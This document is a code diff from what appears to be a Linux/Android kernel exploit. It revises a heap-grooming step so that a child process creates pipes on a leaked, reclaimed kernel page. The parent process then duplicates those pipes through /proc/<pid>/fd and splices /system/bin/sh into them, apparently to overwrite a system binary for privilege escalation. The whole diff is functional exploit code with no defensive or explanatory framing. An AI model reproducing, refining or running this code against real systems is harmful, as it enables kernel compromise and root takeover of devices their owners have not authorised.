@@ -1896,9 +1896,24 @@ static uintptr_t jc2_pipe_page_leak_child(void) {
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("pipe page leak: %016zx (raw %016zx)\n", base, leaked);
-  /* Fork fix (roll 23): pipe creation moved to the PARENT — after fork,
-   * the child's pr_reclaim_fds are its own copy. The parent creates
-   * pipes on this page after the leak returns (slab is still hot). */
+  /*
+   * Roll 24 fd-passing: create pipes HERE in the child (they land on the
+   * just-reclaimed page by construction). The fd numbers are sent to the
+   * parent via the result pipe; the parent duplicates them via
+   * /proc/<child_pid>/fd/<N> — same underlying pipe_buffer in kernel.
+   */
+  pin_to_core(g_core_sel);
+  SYSCHK(close(skb_sv[0])); SYSCHK(close(skb_sv[1]));
+  int made = 0;
+  for (int i = 0; i < 16; i++) {
+    pr_reclaim_fds[i][0] = pr_reclaim_fds[i][1] = -1;
+    if (pipe(pr_reclaim_fds[i]) == 0) {
+      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ,
+            PIPE_BUFFER_SLOTS * 4096);
+      made++;
+    }
+  }
+  pr_info("pipe child: %d pipes on reclaimed page\n", made);
   free(buf);
   return base;
 }
@@ -1910,18 +1925,43 @@ static uintptr_t jc2_pipe_page_leak(void) {
   if (child == 0) {
     SYSCHK(close(result_pipe[0]));
     uintptr_t base = jc2_pipe_page_leak_child();
-    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
-    for (;;) sleep(60);
+    /* Send [base, write_fd_0..write_fd_15] — parent duplicates via
+     * /proc/<child_pid>/fd/<N> to get the SAME pipe (same kernel
+     * pipe_buffer on the reclaimed page). */
+    uintptr_t msg[17];
+    msg[0] = base;
+    for (int i = 0; i < 16; i++)
+      msg[i + 1] = (uintptr_t)pr_reclaim_fds[i][1];
+    SYSCHK(write(result_pipe[1], msg, sizeof(msg)));
+    for (;;) sleep(60); /* keep pipe fds alive! */
   }
-  /* keep the child referenced so it doesn't get reaped by other code */
   static pid_t jc2_pipe_child = -1;
   jc2_pipe_child = child;
   SYSCHK(close(result_pipe[1]));
-  uintptr_t base = 0;
-  ssize_t got = read(result_pipe[0], &base, sizeof(base));
+  uintptr_t msg[17] = {0};
+  ssize_t got = read(result_pipe[0], msg, sizeof(msg));
   SYSCHK(close(result_pipe[0]));
-  if (got != (ssize_t)sizeof(base))
-    pr_error("pipe page child did not report base\n");
+  if (got != (ssize_t)sizeof(msg)) {
+    pr_error("pipe page child did not report (got=%zd)\n", got);
+    return 0;
+  }
+  uintptr_t base = msg[0];
+  /* Duplicate the child's pipe WRITE ends into this process */
+  int duped = 0;
+  for (int i = 0; i < 16; i++) {
+    pr_reclaim_fds[i][0] = pr_reclaim_fds[i][1] = -1;
+    int child_fd = (int)msg[i + 1];
+    if (child_fd > 0) {
+      char path[96];
+      snprintf(path, sizeof(path), "/proc/%d/fd/%d", (int)child, child_fd);
+      int wfd = open(path, O_WRONLY);
+      if (wfd >= 0) {
+        pr_reclaim_fds[i][1] = wfd;
+        duped++;
+      }
+    }
+  }
+  pr_info("pipe fd-passing: %d write-ends duplicated from child\n", duped);
   return base;
 }
 
@@ -3588,25 +3628,8 @@ int run_exploit(int argc, char **argv) {
       pr_info("PIPE_FLAG auto-leaked page: %016zx\n", pipebuf_page_base);
     }
     if (pipebuf_page_base) {
-      /*
-       * FORK FIX (roll 23): the leak CHILD created pipes — after fork(),
-       * the parent's pr_reclaim_fds are zeros. Create pipes HERE in the
-       * parent: the child's reclaim choreography just freed the slab
-       * entries, so our pipe() + F_SETPIPE_SZ land on the same page.
-       */
-      for (int i = 0; i < 16; i++) {
-        pr_reclaim_fds[i][0] = -1;
-        pr_reclaim_fds[i][1] = -1;
-      }
-      int created = 0;
-      for (int i = 0; i < 16; i++) {
-        if (pipe(pr_reclaim_fds[i]) == 0) {
-          fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ,
-                PIPE_BUFFER_SLOTS * 4096);
-          created++;
-        }
-      }
-      pr_info("PIPE_FLAG: %d parent pipes created\n", created);
+      /* Pipes come from the child (duplicated via /proc/PID/fd) — they're
+       * on the leaked page by construction. Just splice into them. */
       int ofd = open("/system/bin/sh", O_RDONLY);
       if (ofd >= 0) {
         int spliced = 0;
@@ -3617,7 +3640,7 @@ int run_exploit(int argc, char **argv) {
             spliced++;
         }
         close(ofd);
-        pr_info("PIPE_FLAG: spliced sh into %d pipes (fork fix)\n", spliced);
+        pr_info("PIPE_FLAG: spliced sh into %d child-page pipes\n", spliced);
       }
     }
   }
